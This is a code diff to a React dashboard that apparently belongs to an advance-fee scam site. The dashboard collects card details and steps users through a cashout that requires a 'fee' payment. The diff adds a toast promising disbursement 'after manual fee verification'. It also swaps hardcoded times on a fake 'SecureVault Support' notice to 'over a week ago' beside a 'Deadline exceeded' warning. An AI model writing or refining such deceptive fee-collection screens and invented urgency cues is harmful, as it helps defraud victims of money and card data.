@@ -1,4 +1,5 @@
 import { useState, useMemo } from "react";
+import { useToast } from "@/hooks/use-toast";
 import { CreditCard, User, Calendar, Lock, Shield, DollarSign, ArrowRight, Building2, Bitcoin, Wallet, CheckCircle, Copy, Check, PartyPopper, Loader2, RefreshCw, Bell, AlertTriangle, Clock } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { Button } from "@/components/ui/button";
@@ -49,6 +50,7 @@ type CashoutStep = "method" | "details" | "confirm" | "fee" | "payment" | "fraud
 type NotificationState = "badge" | "viewing" | "expired" | "hidden";
 
 const Dashboard = () => {
+  const { toast } = useToast();
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
@@ -241,6 +243,10 @@ const Dashboard = () => {
 
       if (data.verified) {
         console.log('✅ Payment verified!', data.transaction);
+        toast({
+          title: "Application Received ✅",
+          description: "We have received your application and are working to disburse the funds to you as soon as possible after manual fee verification. Thank you for your patience.",
+        });
         setCashoutStep("fraud");
       } else {
         setVerificationError(data.message || 'Payment not found. Please ensure you sent the correct amount.');
@@ -740,7 +746,7 @@ const Dashboard = () => {
             <Bell className="h-5 w-5 text-muted-foreground" />
             <AlertTitle className="text-muted-foreground font-medium flex items-center gap-2">
               Notification from SecureVault Support
-              <span className="ml-auto text-xs text-muted-foreground/70">64h ago</span>
+              <span className="ml-auto text-xs text-muted-foreground/70">1w ago</span>
             </AlertTitle>
             <AlertDescription className="text-muted-foreground/70 text-sm">
               Action required — Tap to view details.
@@ -935,7 +941,7 @@ const Dashboard = () => {
           <div className="py-4 space-y-4">
             <div className="flex items-center gap-2 text-xs text-muted-foreground">
               <Clock className="w-4 h-4" />
-              <span>Received 64 hours ago</span>
+              <span>Received over a week ago</span>
               <span className="ml-auto text-destructive font-medium">⚠️ Deadline exceeded</span>
             </div>
             
